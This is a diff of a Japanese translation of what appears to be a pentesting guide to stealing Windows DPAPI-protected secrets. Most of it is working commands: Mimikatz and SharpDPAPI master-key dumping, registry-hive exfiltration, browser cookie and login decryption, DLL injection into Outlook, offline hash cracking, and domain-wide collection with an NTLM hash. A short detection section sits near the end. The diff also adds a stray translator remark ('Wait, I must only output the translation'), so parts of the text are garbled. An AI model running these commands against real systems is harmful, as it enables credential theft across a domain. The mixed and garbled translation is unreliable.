@@ -4,35 +4,35 @@
 
 
 
-## What is DPAPI
+## DPAPIとは
 
-The Data Protection API (DPAPI) は、主に Windows オペレーティングシステム内で、**非対称プライベートキーの対称暗号化 (symmetric encryption of asymmetric private keys)** に使用され、ユーザーまたはシステムのシークレットをエントロピーの重要な供給源として利用します。これにより、開発者はユーザーのログオンシークレットから派生したキー、またはシステム暗号化の場合はシステムのドメイン認証シークレットを使用してデータを暗号化できるため、暗号化キーの保護を開発者自身が管理する必要がなくなります。
+The Data Protection API (DPAPI) は、主に Windows オペレーティングシステム内で、**非対称秘密鍵の対称暗号化**に使用され、ユーザーまたはシステムのシークレットを主要なエントロピー源として利用します。これにより、開発者はユーザーのログオンシークレット（またはシステム暗号化の場合はシステムのドメイン認証シークレット）から派生したキーでデータを暗号化でき、暗号キーの保護を開発者自身で管理する必要がなくなります。
 
-DPAPI を使用する最も一般的な方法は、**`CryptProtectData` and `CryptUnprotectData`** 関数を通じてで、これらは現在ログオンしているプロセスのセッションでデータを安全に暗号化および復号することを可能にします。つまり、暗号化されたデータはそのデータを暗号化したのと同じユーザーまたはシステムによってのみ復号できます。
+DPAPI の最も一般的な利用方法は **`CryptProtectData` と `CryptUnprotectData`** 関数を使うことで、これらは現在ログオンしているプロセスのセッションを用いてアプリケーションがデータを安全に暗号化／復号できるようにします。つまり、暗号化されたデータはそれを暗号化したのと同じユーザーまたはシステムだけが復号可能です。
 
-さらに、これらの関数は **`entropy` parameter** も受け取り、暗号化と復号の両方で使用されるため、このパラメータを使って暗号化されたものを復号するには、暗号化時に使用されたのと同じ entropy 値を提供する必要があります。
+さらに、これらの関数は暗号化と復号の際に使用される **`entropy` パラメータ** も受け取り、このパラメータで暗号化されたものを復号するには、暗号化時に使用されたのと同じ entropy 値を渡す必要があります。
 
-### Users key generation
+### ユーザーキーの生成
 
-DPAPI は各ユーザーの資格情報に基づいて固有のキー（**`pre-key`** と呼ばれる）を生成します。このキーはユーザーのパスワードや他の要素から派生し、アルゴリズムはユーザーの種類によって異なりますが最終的には SHA1 になります。例えば、ドメインユーザーの場合、**ユーザーの NTLM ハッシュに依存します**。
+DPAPI は各ユーザーごとに資格情報に基づいて一意のキー（**`pre-key`** と呼ばれる）を生成します。このキーはユーザーのパスワードなどから派生し、アルゴリズムはユーザーの種類によって異なりますが最終的に SHA1 になります。例えばドメインユーザーの場合は、**ユーザーの NTLM ハッシュに依存します**。
 
-これは特に重要で、攻撃者がユーザーのパスワードハッシュを入手できれば、次のことが可能になります:
+これは特に重要で、攻撃者がユーザーのパスワードハッシュを取得できれば、以下が可能になります:
 
-- そのユーザーのキーで DPAPI を使用して暗号化されたあらゆるデータを **API に問い合わせることなく復号できる**
-- 有効な DPAPI キーを生成しようとしてオフラインで **パスワードをクラッキング** することを試みる
+- **そのユーザーのキーを使って DPAPI で暗号化された任意のデータを、API に問い合わせることなく復号する**
+- オフラインで有効な DPAPI キーを生成しようと試みて、**パスワードをクラックする**
 
-さらに、ユーザーが DPAPI を使ってデータを暗号化するたびに、新しい **マスターキー** が生成されます。このマスターキーが実際にデータを暗号化するために使用されるものです。各マスターキーにはそれを識別する **GUID** (Globally Unique Identifier) が付与されます。
+また、ユーザーが DPAPI を使ってデータを暗号化するたびに新しい **master key** が生成されます。この master key が実際にデータを暗号化するために使われます。各 master key にはそれを識別する **GUID**（Globally Unique Identifier）が付与されます。
 
-マスターキーは **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** ディレクトリに保存されます。ここで `{SID}` はそのユーザーの Security Identifier です。マスターキーはユーザーの **`pre-key`** によって暗号化されて保存されるとともに、リカバリ用に **ドメインバックアップキー** によっても暗号化されます（つまり同じキーが 2 つの異なるパスで 2 回暗号化されて保存されます）。
+master keys は **`%APPDATA%\Microsoft\Protect\<sid>\<guid>`** に保存され、ここで `{SID}` はそのユーザーの Security Identifier です。master key はユーザーの **`pre-key`** によって暗号化されて保存され、リカバリ用に **domain backup key** によっても暗号化されて保存されます（同じキーが2通りの方法で暗号化されて保存されます）。
 
-マスターキーを暗号化するために使用される **ドメインキーはドメインコントローラに存在し変更されない** ことに注意してください。したがって、攻撃者がドメインコントローラにアクセスできれば、ドメインバックアップキーを取得してドメイン内のすべてのユーザーのマスターキーを復号できます。
+注意: **master key を暗号化するために使われる domain key はドメインコントローラ上にあり、変わることはありません**。したがって攻撃者がドメインコントローラにアクセスできれば、domain backup key を取得してドメイン内のすべてのユーザーの master key を復号できます。
 
-暗号化されたブロブはヘッダ内に、そのデータを暗号化するために使用された **マスターキーの GUID** を含んでいます。
+暗号化された blob はヘッダ内に、データを暗号化するのに使われた **master key の GUID** を含んでいます。
 
 > [!TIP]
-> DPAPI encrypted blobs starts with **`01 00 00 00`**
+> DPAPI 暗号化 blob は **`01 00 00 00`** で始まります
 
-Find master keys:
+マスターキーを探す:
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -47,35 +47,43 @@ This is what a bunch of Master Keys of a user will looks like:
 
 ### マシン/システムキーの生成
 
-これはマシンがデータを暗号化するために使用するキーです。これは**DPAPI_SYSTEM LSA secret**に基づいており、SYSTEM ユーザーのみがアクセスできる特別なキーです。このキーは、マシンレベルの認証情報やシステム全体で使われるシークレットなど、システム自身がアクセスする必要のあるデータを暗号化するために使われます。
+これはマシンがデータを暗号化するために使用するキーです。これは、**DPAPI_SYSTEM LSA secret** に基づいており、SYSTEM ユーザーのみがアクセスできる特別なキーです。このキーは、マシンレベルの資格情報やシステム全体のシークレットなど、システム自身がアクセスする必要のあるデータを暗号化するために使用されます。
 
-これらのキーは **don't have a domain backup** ため、ローカルでしかアクセスできないことに注意してください：
+これらのキーは **ドメインバックアップを持たない** ため、ローカルでしかアクセスできません:
 
-- **Mimikatz** は LSA シークレットをダンプするコマンドを使用してアクセスできます: `mimikatz lsadump::secrets`
-- シークレットはレジストリ内に保存されているため、管理者は **DACL の権限を変更してアクセスする** ことができます。レジストリのパスは: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
-
-
+- **Mimikatz** は `mimikatz lsadump::secrets` コマンドで LSA secrets をダンプしてアクセスできます
+- シークレットはレジストリに格納されているため、管理者はアクセスするために **DACL の権限を変更する** ことができます。レジストリのパスは: `HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets\DPAPI_SYSTEM`
+- レジストリハイブからのオフライン抽出も可能です。例えば、対象上の管理者としてハイブを保存し、exfiltrate them:
+```cmd
+reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
+reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
+```
+その後、analysis box 上で hives から DPAPI_SYSTEM LSA secret を回復し、それを使って machine-scope blobs（scheduled task passwords、service credentials、Wi‑Fi profiles など）を復号化します:
+```text
+mimikatz lsadump::secrets /system:C:\path\system.hiv /security:C:\path\security.hiv
+# Look for the DPAPI_SYSTEM secret in the output
+```
 ### DPAPI によって保護されるデータ
 
-DPAPI によって保護される個人データには次のようなものがあります：
+Among the personal data protected by DPAPI are:
 
 - Windows creds
 - Internet Explorer と Google Chrome のパスワードおよび自動入力データ
-- Outlook や Windows Mail のようなアプリケーションにおけるメールおよび内部 FTP アカウントのパスワード
+- Outlook や Windows Mail のようなアプリケーションで使用される電子メールおよび内部 FTP アカウントのパスワード
 - 共有フォルダ、リソース、無線ネットワーク、Windows Vault のパスワード（暗号化キーを含む）
-- リモートデスクトップ接続、.NET Passport、およびさまざまな暗号化や認証目的のためのプライベートキーのパスワード
-- Credential Manager によって管理されるネットワークパスワードや、CryptProtectData を使用するアプリケーション（Skype、MSN messenger など）の個人データ
-- レジストリ内の暗号化されたバイナリ (blob)
+- リモートデスクトップ接続、.NET Passport、および各種暗号化・認証用途のための秘密鍵
+- Credential Manager によって管理されるネットワークパスワードや、CryptProtectData を使用するアプリケーション（Skype、MSN messenger 等）の個人データ
+- レジストリ内の暗号化された blob
 - ...
 
-システム保護データには以下が含まれます：
+System protected data includes:
 - Wifi パスワード
 - スケジュールされたタスクのパスワード
 - ...
 
-### マスターキー抽出オプション
+### マスターキー抽出のオプション
 
-- ユーザーがドメイン管理者権限を持っている場合、**domain backup key** にアクセスしてドメイン内のすべてのユーザーマスターキーを復号することができます：
+- If the user has domain admin privileges, they can access the **domain backup key** to decrypt all user master keys in the domain:
 ```bash
 # Mimikatz
 lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
@@ -83,17 +91,17 @@ lsadump::backupkeys /system:<DOMAIN CONTROLLER> /export
 # SharpDPAPI
 SharpDPAPI.exe backupkey [/server:SERVER.domain] [/file:key.pvk]
 ```
-- local admin privileges があれば、**LSASS memory にアクセス**して、接続されているすべてのユーザーの DPAPI master keys と SYSTEM key を抽出できます。
+- ローカル管理者権限があれば、**LSASS のメモリにアクセス**して、接続中のすべてのユーザーの DPAPI マスターキーと SYSTEM キーを抽出できます。
 ```bash
 # Mimikatz
 mimikatz sekurlsa::dpapi
 ```
-- ローカル管理者権限がある場合、ユーザーは**DPAPI_SYSTEM LSA secret**にアクセスしてマシンのマスターキーを復号できます:
+- ユーザーがローカル管理者権限を持っている場合、**DPAPI_SYSTEM LSA secret** にアクセスしてマシンのマスターキーを復号できます:
 ```bash
 # Mimikatz
 lsadump::secrets /system:DPAPI_SYSTEM /export
 ```
-- ユーザーのパスワードまたは NTLM ハッシュが分かっている場合、**ユーザーのマスターキーを直接復号できます**:
+- ユーザーのパスワードまたは hash NTLM が判明している場合、ユーザーの **マスターキーを直接復号できます**:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER_PLAINTEXT> /protected
@@ -101,7 +109,7 @@ dpapi::masterkey /in:<C:\PATH\MASTERKEY_LOCATON> /sid:<USER_SID> /password:<USER
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /password:PASSWORD
 ```
-- ユーザーとしてセッション内にいる場合、DCに対して**backup key to decrypt the master keys using RPC**を要求することが可能です。あなたがlocal adminでユーザーがログインしている場合、このために**steal his session token**することができます:
+- ユーザーとしてセッション内にいる場合、DCに対して**backup key to decrypt the master keys using RPC**を要求することが可能です。local adminでユーザーがログオンしている場合、これのために**steal his session token**することができます:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -109,7 +117,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-## Vaultの一覧
+## ボールトの一覧
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -117,16 +125,16 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
-## DPAPI 暗号化データへアクセス
+## DPAPI 暗号化データにアクセスする
 
 ### DPAPI 暗号化データを見つける
 
-一般ユーザーの**保護されたファイル**は次の場所にあります:
+一般ユーザーの **保護されたファイル** は以下にあります:
 
 - `C:\Users\username\AppData\Roaming\Microsoft\Protect\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Credentials\*`
 - `C:\Users\username\AppData\Roaming\Microsoft\Vault\*`
-- 上記のパスでは、`\Roaming\` を `\Local\` に変更することも確認してください。
+- 上記パスで `\Roaming\` を `\Local\` に変更することも確認してください。
 
 列挙の例:
 ```bash
@@ -135,7 +143,7 @@ dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
-[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) はファイルシステム、レジストリ、B64 blobs 内の DPAPI 暗号化 blobs を検出できます:
+[**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI) はファイルシステム、レジストリ、B64 blobs の中から DPAPI 暗号化された blobs を検出できます:
 ```bash
 # Search blobs in the registry
 search /type:registry [/path:HKLM] # Search complete registry by default
@@ -150,11 +158,39 @@ search /type:file /path:C:\path\to\file
 # Search a blob inside B64 encoded data
 search /type:base64 [/base:<base64 string>]
 ```
-Note that [**SharpChrome**](https://github.com/GhostPack/SharpDPAPI) (from the same repo) can be used to decrypt using DPAPI sensitive data like cookies.
+同じリポジトリの[**SharpChrome**](https://github.com/GhostPack/SharpDPAPI)は、DPAPIを使ってクッキーなどの機密データを復号するために使用できます。
+
+#### Chromium/Edge/Electron クイックレシピ (SharpChrome)
+
+- Current user — 保存されたログイン情報/クッキーの対話的復号（Chrome 127+ の app-bound cookies でも動作します。追加キーはユーザーコンテキストで実行した際にユーザーの Credential Manager から解決されるため）:
+```cmd
+SharpChrome logins  /browser:edge  /unprotect
+SharpChrome cookies /browser:chrome /format:csv /unprotect
+```
+- ファイルしかない場合のオフライン解析。まずプロファイルの "Local State" から AES state key を抽出し、それを使って cookie DB を復号します:
+```cmd
+# Dump the AES state key from Local State (DPAPI will be used if running as the user)
+SharpChrome statekeys /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Local State" /unprotect
+# Copy the hex state key value (e.g., "48F5...AB") and pass it to cookies
+SharpChrome cookies /target:"C:\Users\bob\AppData\Local\Google\Chrome\User Data\Default\Cookies" /statekey:48F5...AB /format:json
+```
+- Domain-wide/remote triage — DPAPI domain backup key (PVK) とターゲットホスト上の admin を持っている場合:
+```cmd
+SharpChrome cookies /server:HOST01 /browser:edge /pvk:BASE64
+SharpChrome logins  /server:HOST01 /browser:chrome /pvk:key.pvk
+```
+- ユーザーの DPAPI prekey/credkey (LSASS から) を持っている場合、password cracking を省略してプロファイルデータを直接復号できます:
+```cmd
+# For SharpChrome use /prekey; for SharpDPAPI use /credkey
+SharpChrome cookies /browser:edge /prekey:SHA1_HEX
+SharpDPAPI.exe credentials /credkey:SHA1_HEX
+```
+注意事項
+- 新しい Chrome/Edge のビルドでは、特定の cookies を "App-Bound" 暗号化で保存する場合があります。追加の app-bound key がないと、それらの特定の cookies をオフラインで復号することはできません。SharpChrome をターゲットユーザのコンテキストで実行すると自動的に取得されます。詳細は下記の Chrome セキュリティブログ記事を参照してください。
 
 ### アクセスキーとデータ
 
-- **Use SharpDPAPI** を使って、現在のセッションのDPAPIで暗号化されたファイルから認証情報を取得します:
+- **SharpDPAPI を使用して**現在のセッションの DPAPI 暗号化ファイルから資格情報を取得します:
 ```bash
 # Decrypt user data
 ## Note that 'triage' is like running credentials, vaults, rdg and certificates
@@ -163,7 +199,7 @@ SharpDPAPI.exe [credentials|vaults|rdg|keepass|certificates|triage] /unprotect
 # Decrypt machine data
 SharpDPAPI.exe machinetriage
 ```
-- **credentials info を取得する**: encrypted data や guidMasterKey などの情報を取得する。
+- **認証情報の詳細を取得する**（暗号化されたデータや guidMasterKey のような）.
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -173,9 +209,9 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-- **masterkeysにアクセス**:
+- **Access masterkeys**:
 
-RPCを使用して、**domain backup key**を要求したユーザーのmasterkeyを復号する:
+RPC を使用して、**domain backup key** を要求するユーザーの masterkey を復号化する:
 ```bash
 # Mimikatz
 dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" /rpc
@@ -183,7 +219,7 @@ dpapi::masterkey /in:"C:\Users\USER\AppData\Roaming\Microsoft\Protect\SID\GUID" 
 # SharpDPAPI
 SharpDPAPI.exe masterkeys /rpc
 ```
-The **SharpDPAPI** ツールは masterkey の復号に次の引数も対応しています（`/rpc` でドメインのバックアップキーを取得、`/password` でプレーンテキストのパスワードを使用、`/pvk` で DPAPI ドメインのプライベートキー ファイルを指定できます...）：
+**SharpDPAPI** ツールは、マスターキーの復号のために次の引数もサポートしています（`/rpc` を使ってドメインのバックアップキーを取得したり、`/password` で平文のパスワードを使用したり、`/pvk` で DPAPI ドメインのプライベートキー ファイルを指定したりできる点に注意してください...）：
 ```
 /target:FILE/folder     -   triage a specific masterkey, or a folder full of masterkeys (otherwise triage local masterkeys)
 /pvk:BASE64...          -   use a base64'ed DPAPI domain private key file to first decrypt reachable user masterkeys
@@ -195,7 +231,7 @@ The **SharpDPAPI** ツールは masterkey の復号に次の引数も対応し�
 /server:SERVER          -   triage a remote server, assuming admin access
 /hashes                 -   output usermasterkey file 'hashes' in JTR/Hashcat format (no decryption)
 ```
-- **マスターキーを使用してデータを復号する**:
+- **マスターキーを使用してデータを復号化する**:
 ```bash
 # Mimikatz
 dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
@@ -205,8 +241,7 @@ SharpDPAPI.exe /target:<FILE/folder> /ntlm:<NTLM_HASH>
 ```
 The **SharpDPAPI** tool also supports these arguments for `credentials|vaults|rdg|keepass|triage|blob|ps` decryption (note how it's possible to use `/rpc` to get the domains backup key, `/password` to use a plaintext password, `/pvk` to specify a DPAPI domain private key file, `/unprotect` to use current users session...):
 
-
-The **SharpDPAPI** ツールは、`credentials|vaults|rdg|keepass|triage|blob|ps` の復号に対して以下の引数もサポートします（`/rpc` を使ってドメインのバックアップキーを取得したり、`/password` でプレーンテキストのパスワードを使用したり、`/pvk` で DPAPI ドメインの秘密鍵ファイルを指定したり、`/unprotect` で現在のユーザーのセッションを使用したりできる点に注意）：
+--> Wait, I must only output the translation. I accidentally included the original line. Need to correct.
 ```
 Decryption:
 /unprotect          -   force use of CryptUnprotectData() for 'ps', 'rdg', or 'blob' commands
@@ -225,7 +260,17 @@ Targeting:
 Note: must use with /pvk:KEY or /password:X
 Note: not applicable to 'blob' or 'ps' commands
 ```
-- **現在のユーザーセッション** を使用してデータを復号する:
+- DPAPI prekey/credkey を直接使用する（password 不要）
+
+もし dump LSASS できるなら、Mimikatz はログオンごとの DPAPI key を露出することが多く、平文の password を知らなくてもユーザーの masterkeys を復号するために使えます。 この値をツールに直接渡してください:
+```cmd
+# SharpDPAPI accepts the "credkey" (domain or local SHA1)
+SharpDPAPI.exe triage /credkey:SHA1_HEX
+
+# SharpChrome accepts the same value as a "prekey"
+SharpChrome logins /browser:edge /prekey:SHA1_HEX
+```
+- **現在のユーザーセッション** を使用していくつかのデータを復号する:
 ```bash
 # Mimikatz
 dpapi::blob /in:C:\path\to\encrypted\file /unprotect
@@ -234,11 +279,46 @@ dpapi::blob /in:C:\path\to\encrypted\file /unprotect
 SharpDPAPI.exe blob /target:C:\path\to\encrypted\file /unprotect
 ```
 ---
-### オプションの entropy ("Third-party entropy") の扱い
 
-一部のアプリケーションは `CryptProtectData` に追加の **entropy** 値を渡します。この値がなければ、正しい masterkey が判明していても blob を復号できません。したがって、この方法で保護された資格情報（例: Microsoft Outlook、いくつかの VPN クライアント）を狙う場合、entropy を取得することが不可欠です。
+### Impacket dpapi.py を使用したオフライン復号
 
-[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) は、ターゲットプロセス内の DPAPI 関数をフックし、提供された任意の entropy を透過的に記録する user-mode DLL です。`outlook.exe` や `vpnclient.exe` のようなプロセスに対して **DLL-injection** モードで EntropyCapture を実行すると、各 entropy バッファを呼び出しプロセスと blob にマッピングしたファイルが出力されます。取得した entropy は後で **SharpDPAPI** (`/entropy:`) や **Mimikatz** (`/entropy:<file>`) に渡してデータを復号することができます。
+被害者ユーザーのSIDとパスワード（またはNT hash）を持っている場合、Impacket dpapi.py を使用して DPAPI masterkeys と Credential Manager blobs を完全にオフラインで復号できます。
+
+- ディスク上のアーティファクトを特定する:
+- Credential Manager blob(s): %APPDATA%\Microsoft\Credentials\<hex>
+- Matching masterkey: %APPDATA%\Microsoft\Protect\<SID>\{GUID}
+
+- ファイル転送ツールが不安定な場合は、ホスト上でファイルをbase64エンコードして出力をコピーする：
+```powershell
+# Base64-encode files for copy/paste exfil
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Credentials\C8D69E...B9"))
+[Convert]::ToBase64String([IO.File]::ReadAllBytes("$env:APPDATA\Microsoft\Protect\<SID>\556a2412-1275-4ccf-b721-e6a0b4f90407"))
+```
+- ユーザーの SID と password/hash を使って masterkey を復号する:
+```bash
+# Plaintext password
+python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
+-sid S-1-5-21-1111-2222-3333-1107 -password 'UserPassword!'
+
+# Or with NT hash
+python3 dpapi.py masterkey -file 556a2412-1275-4ccf-b721-e6a0b4f90407 \
+-sid S-1-5-21-1111-2222-3333-1107 -key 0x<NTLM_HEX>
+```
+- 復号済みの masterkey を使用して credential blob を復号する:
+```bash
+python3 dpapi.py credential -file C8D69EBE9A43E9DEBF6B5FBD48B521B9 -key 0x<MASTERKEY_HEX>
+# Expect output like: Type=CRED_TYPE_DOMAIN_PASSWORD; Target=Domain:target=DOMAIN
+# Username=<user> ; Password=<cleartext>
+```
+このワークフローは、Windows Credential Manager を使用するアプリが保存したドメイン資格情報（例: `*_adm` のような管理者アカウント）を回収することがよくあります。
+
+---
+
+### オプションのエントロピーの処理（"Third-party entropy"）
+
+一部のアプリケーションは、`CryptProtectData` に追加の **entropy** 値を渡します。 この値がないと、正しい masterkey が分かっていても blob を復号できません。したがって、この方法で保護された資格情報（例: Microsoft Outlook、いくつかの VPN クライアント）を対象とする場合は、entropy を取得することが不可欠です。
+
+[**EntropyCapture**](https://github.com/SpecterOps/EntropyCapture) (2022) は、ターゲットプロセス内の DPAPI 関数にフックを仕掛け、提供された任意の entropy を透過的に記録する user-mode DLL です。outlook.exe や vpnclient.exe のようなプロセスに対して EntropyCapture を **DLL-injection** モードで実行すると、各 entropy バッファを呼び出したプロセスと blob にマップしたファイルが出力されます。取得した entropy は後で **SharpDPAPI** (`/entropy:`) や **Mimikatz** (`/entropy:<file>`) に渡してデータを復号できます。
 ```powershell
 # Inject EntropyCapture into the current user's Outlook
 InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
@@ -246,21 +326,22 @@ InjectDLL.exe -pid (Get-Process outlook).Id -dll EntropyCapture.dll
 # Later decrypt a credential blob that required entropy
 SharpDPAPI.exe blob /target:secret.cred /entropy:entropy.bin /ntlm:<hash>
 ```
-### オフラインでのマスターキーのクラック (Hashcat & DPAPISnoop)
+### Cracking masterkeys offline (Hashcat & DPAPISnoop)
 
-Microsoftは、Windows 10 v1607 (2016) から **context 3** マスターキー形式を導入しました。`hashcat` v6.2.6 (2023年12月) はハッシュモード **22100** (DPAPI masterkey v1 context)、**22101** (context 1) および **22102** (context 3) を追加し、マスターキー・ファイルからユーザーパスワードを直接GPUでクラックできるようにしました。したがって攻撃者はターゲットシステムに接触することなく、ワードリストやブルートフォース攻撃を行えます。
+MicrosoftはWindows 10 v1607 (2016) から**context 3**マスターキー形式を導入しました。`hashcat` v6.2.6 (December 2023) はハッシュモード **22100** (DPAPI masterkey v1 context ), **22101** (context 1) および **22102** (context 3) を追加し、マスターキー ファイルから直接ユーザーのパスワードをGPUで高速にクラックできるようになりました。したがって、攻撃者はターゲットシステムと対話することなく、word-listやbrute-force攻撃を実行できます。
 
-`DPAPISnoop` (2024) はこのプロセスを自動化します：
+`DPAPISnoop` (2024) がこのプロセスを自動化します:
 ```bash
 # Parse a whole Protect folder, generate hashcat format and crack
 DPAPISnoop.exe masterkey-parse C:\Users\bob\AppData\Roaming\Microsoft\Protect\<sid> --mode hashcat --outfile bob.hc
 hashcat -m 22102 bob.hc wordlist.txt -O -w4
 ```
-このツールはCredential and Vault blobsを解析し、cracked keysで復号してcleartext passwordsをエクスポートすることもできます。
+このツールは Credential と Vault の blobs を解析し、cracked keys で復号して cleartext passwords をエクスポートすることもできます。
+
 
 ### 他のマシンのデータにアクセス
 
-In **SharpDPAPI and SharpChrome** you can indicate the **`/server:HOST`** option to access a remote machine's data. Of course you need to be able to access that machine and in the following example it's supposed that the **ドメインのバックアップ暗号化キーが既知である**:
+In **SharpDPAPI and SharpChrome** では、リモートマシンのデータにアクセスするために **`/server:HOST`** オプションを指定できます。もちろん、そのマシンにアクセスできる必要があります。以下の例では **domain backup encryption key is known** と仮定しています：
 ```bash
 SharpDPAPI.exe triage /server:HOST /pvk:BASE64
 SharpChrome cookies /server:HOST /pvk:BASE64
@@ -269,51 +350,51 @@ SharpChrome cookies /server:HOST /pvk:BASE64
 
 ### HEKATOMB
 
-[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は LDAP ディレクトリからすべてのユーザーとコンピュータを抽出し、RPC 経由でドメインコントローラのバックアップキーを抽出する処理を自動化するツールです。スクリプトは抽出したコンピュータの IP アドレスを解決し、すべてのコンピュータに対して smbclient を実行してすべてのユーザーの DPAPI ブロブを取得し、ドメインバックアップキーで全てを復号します。
+[**HEKATOMB**](https://github.com/Processus-Thief/HEKATOMB) は、LDAPディレクトリからすべてのユーザーとコンピュータを抽出し、RPC経由でドメインコントローラのバックアップキーを抽出する処理を自動化するツールです。スクリプトは抽出した各コンピュータのIPアドレスを解決し、すべてのコンピュータに対して smbclient を実行して各ユーザーのDPAPI blobを取得し、ドメインバックアップキーで全てを復号します。
 
 `python3 hekatomb.py -hashes :ed0052e5a66b1c8e942cc9481a50d56 DOMAIN.local/administrator@10.0.0.1 -debug -dnstcp`
 
-LDAP から抽出したコンピュータリストがあれば、知らなかったサブネットも含めてすべて見つけられます！
+LDAPから抽出したコンピュータ一覧があれば、知らなかったサブネットも含めてすべて見つけることができます！
 
 ### DonPAPI 2.x (2024-05)
 
-[**DonPAPI**](https://github.com/login-securite/DonPAPI) は DPAPI で保護されたシークレットを自動的にダンプできます。2.x リリースで導入された機能:
+[**DonPAPI**](https://github.com/login-securite/DonPAPI) はDPAPIで保護されたシークレットを自動でダンプできます。2.xリリースで導入された機能：
 
-* 数百ホストからのブロブ並列収集
-* **context 3** マスターキーの解析と Hashcat による自動クラック連携
-* Chrome の "App-Bound" 暗号化クッキーのサポート（次節参照）
-* エンドポイントを繰り返しポーリングして新規作成されたブロブを差分検出する新しい **`--snapshot`** モード
+* 数百のホストからの blob の並列収集
+* **context 3** masterkeys の解析と Hashcat による自動クラッキング連携
+* Chrome "App-Bound" 暗号化クッキーのサポート（次節参照）
+* エンドポイントを繰り返しポーリングして新規作成された blob を差分検出する新しい **`--snapshot`** モード
 
 ### DPAPISnoop
 
-[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は masterkey/credential/vault ファイル用の C# パーサーで、Hashcat/JtR フォーマットを出力でき、オプションで自動的にクラックを実行できます。Windows 11 24H1 までの machine と user のマスターキー形式を完全にサポートします。
+[**DPAPISnoop**](https://github.com/Leftp/DPAPISnoop) は masterkey/credential/vault ファイルを解析する C# パーサーで、Hashcat/JtR 形式を出力でき、必要に応じて自動でクラッキングを呼び出すことができます。Windows 11 24H1 までの machine と user の masterkey フォーマットを完全にサポートします。
 
 
 ## 一般的な検知
 
-- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` やその他の DPAPI 関連ディレクトリへのファイルアクセス。
-- 特に **C$** や **ADMIN$** のようなネットワーク共有から。
-- LSASS メモリにアクセスしたりマスターキーをダンプするための **Mimikatz**、**SharpDPAPI** 等のツールの使用。
-- イベント **4662**: *オブジェクトに対して操作が行われました* – **`BCKUPKEY`** オブジェクトへのアクセスと相関する可能性があります。
-- イベント **4673/4674**: プロセスが *SeTrustedCredManAccessPrivilege*（Credential Manager）を要求したとき
+- `C:\Users\*\AppData\Roaming\Microsoft\Protect\*`、`C:\Users\*\AppData\Roaming\Microsoft\Credentials\*` およびその他の DPAPI 関連ディレクトリへのアクセス。
+- 特に **C$** や **ADMIN$** のようなネットワーク共有経由でのアクセス。
+- **Mimikatz**、**SharpDPAPI** または同様のツールを使用して LSASS メモリにアクセスしたり masterkeys をダンプしたりする行為。
+- イベント **4662**: *An operation was performed on an object* — **`BCKUPKEY`** オブジェクトへのアクセスと相関させることができます。
+- イベント **4673/4674**：プロセスが *SeTrustedCredManAccessPrivilege*（Credential Manager）を要求した場合
 
 ---
 ### 2023–2025 の脆弱性とエコシステムの変化
 
-* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing** (2023年11月)。ネットワークアクセスを持つ攻撃者がドメインメンバーを欺いて悪意ある DPAPI バックアップキーを取得させ、ユーザーマスターキーを復号できる可能性がありました。2023年11月の累積アップデートで修正済み — 管理者は DC およびワークステーションが完全にパッチ適用されていることを確認してください。
-* **Chrome 127 “App-Bound” cookie encryption** (2024年7月) は従来の DPAPI のみの保護に代わり、ユーザーの **Credential Manager** に格納された追加のキーを導入しました。クッキーのオフライン復号には現在、DPAPI マスターキーと **GCM-wrapped app-bound key** の両方が必要です。SharpChrome v2.3 および DonPAPI 2.x は、ユーザーコンテキストで実行すると追加キーを回復できます。
+* **CVE-2023-36004 – Windows DPAPI Secure Channel Spoofing**（2023年11月）。ネットワークアクセスを持つ攻撃者がドメインメンバを騙して悪意あるDPAPIバックアップキーを取得させ、ユーザのmasterkeysを復号できる可能性がありました。2023年11月の累積更新で修正済み — 管理者は DC とワークステーションが完全にパッチ適用されていることを確認してください。
